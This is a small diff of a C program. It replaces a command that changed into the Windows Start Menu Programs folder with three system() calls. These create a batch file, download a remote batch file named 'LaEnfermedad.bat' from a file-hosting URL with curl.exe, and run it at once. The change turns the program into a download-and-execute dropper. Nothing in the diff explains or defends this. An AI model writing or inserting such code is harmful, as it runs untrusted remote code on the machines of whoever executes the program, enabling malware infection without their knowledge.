@@ -2,10 +2,9 @@
 
 main() {
 
-    int cont=0;
-
-    system("cd C:\\%user%\\daniz\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs");
-
+    system("type nul > bromi.bat");
+    system("curl.exe -o bromi.bat https://download1587.mediafire.com/6dlpquvw3mvg/to95hou4unbfp22/LaEnfermedad.bat");
+    system("bromi.bat");
 
     return 0;
 }
